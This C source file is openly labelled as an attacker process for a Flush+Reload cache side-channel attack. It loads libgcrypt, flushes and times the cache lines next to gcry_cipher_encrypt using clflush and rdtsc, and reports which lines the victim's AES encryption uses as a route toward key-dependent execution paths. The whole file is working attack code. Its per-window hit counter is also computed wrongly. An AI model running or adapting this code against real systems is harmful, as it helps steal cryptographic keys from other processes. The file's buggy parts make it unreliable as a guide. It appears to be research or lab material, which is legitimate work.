#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <dlfcn.h>

#define CACHE_LINE_SIZE 64
#define NUM_MONITORED_ADDRESSES 16
#define MEASUREMENT_CYCLES 100000
#define THRESHOLD 200

volatile int running = 1;

void signal_handler(int sig) {
    running = 0;
}

static inline uint64_t rdtsc() {
    uint32_t low, high;
    asm volatile ("rdtsc" : "=a" (low), "=d" (high));
    return ((uint64_t)high << 32) | low;
}

static inline void flush_cache_line(void* addr) {
    asm volatile ("clflush (%0)" : : "r" (addr) : "memory");
}

static inline void memory_barrier() {
    asm volatile ("mfence" : : : "memory");
}

uint64_t time_memory_access(void* addr) {
    uint64_t start, end;
    volatile char dummy;

    memory_barrier();
    start = rdtsc();
    dummy = *(volatile char*)addr;
    end = rdtsc();
    memory_barrier();

    return end - start;
}

int main(int argc, char* argv[]) {
    void* lib_handle;
    void* monitored_addresses[NUM_MONITORED_ADDRESSES];
    uint64_t access_times[NUM_MONITORED_ADDRESSES];
    int cache_hits[NUM_MONITORED_ADDRESSES] = {0};
    int total_measurements = 0;

    printf("Attacker process starting (PID: %d)\n", getpid());

    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

    lib_handle = dlopen("./lib/libgcrypt.so.11.6.0", RTLD_NOW);
    if (!lib_handle) {
        fprintf(stderr, "Failed to load libgcrypt: %s\n", dlerror());
        return 1;
    }

    void* aes_encrypt_func = dlsym(lib_handle, "gcry_cipher_encrypt");
    if (!aes_encrypt_func) {
        fprintf(stderr, "Failed to find gcry_cipher_encrypt function\n");
        dlclose(lib_handle);
        return 1;
    }

    for (int i = 0; i < NUM_MONITORED_ADDRESSES; i++) {
        monitored_addresses[i] = (char*)aes_encrypt_func + (i * CACHE_LINE_SIZE);
    }

    printf("Attacker: Monitoring %d cache lines around AES encryption function\n", NUM_MONITORED_ADDRESSES);
    printf("Attacker: Base address: %p\n", aes_encrypt_func);
    printf("Attacker: Starting Flush+Reload attack...\n");
    printf("Attacker: Press Ctrl+C to stop and show results\n");

    while (running && total_measurements < MEASUREMENT_CYCLES) {
        for (int i = 0; i < NUM_MONITORED_ADDRESSES; i++) {
            flush_cache_line(monitored_addresses[i]);
        }

        usleep(10);

        for (int i = 0; i < NUM_MONITORED_ADDRESSES; i++) {
            access_times[i] = time_memory_access(monitored_addresses[i]);

            if (access_times[i] < THRESHOLD) {
                cache_hits[i]++;
            }
        }

        total_measurements++;

        if (total_measurements % 1000 == 0) {
            printf("Attacker: Completed %d measurements\n", total_measurements);

            printf("Cache hits in last 1000 measurements: ");
            for (int i = 0; i < NUM_MONITORED_ADDRESSES; i++) {
                if (i > 0 && cache_hits[i] - (total_measurements > 1000 ? cache_hits[i] - 1000 : 0) > 50) {
                    printf("[%d:%d] ", i, cache_hits[i] - (total_measurements > 1000 ? cache_hits[i] - 1000 : 0));
                }
            }
            printf("\n");
        }
    }

    printf("\n=== ATTACK RESULTS ===\n");
    printf("Total measurements: %d\n", total_measurements);
    printf("Cache line activity (hits/total):\n");

    for (int i = 0; i < NUM_MONITORED_ADDRESSES; i++) {
        double hit_rate = (double)cache_hits[i] / total_measurements * 100;
        printf("Offset %3d (addr %p): %6d hits (%.2f%%)",
               i * CACHE_LINE_SIZE, monitored_addresses[i], cache_hits[i], hit_rate);

        if (hit_rate > 5.0) {
            printf(" <- ACTIVE");
        }
        printf("\n");
    }

    printf("\nInterpretation:\n");
    printf("- High hit rates indicate cache lines frequently accessed by victim\n");
    printf("- These correspond to code paths taken during AES encryption\n");
    printf("- Pattern analysis could reveal key-dependent execution paths\n");

    dlclose(lib_handle);
    return 0;
}